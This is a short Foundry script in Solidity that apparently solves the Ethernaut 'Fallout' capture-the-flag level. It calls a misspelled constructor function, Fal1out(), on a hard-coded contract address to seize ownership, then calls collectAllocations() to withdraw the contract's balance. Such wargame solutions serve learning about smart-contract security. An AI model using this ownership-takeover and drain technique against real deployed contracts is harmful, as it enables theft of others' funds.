// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/Fallout.sol";

contract Solve is Script {
    function run() external {
        vm.startBroadcast();

        Fallout victim = Fallout(0xedF03322BCbdd3508E491920d548d154b5B24CFa);
        victim.Fal1out();
        victim.collectAllocations(); // optional

        vm.stopBroadcast();
    }
}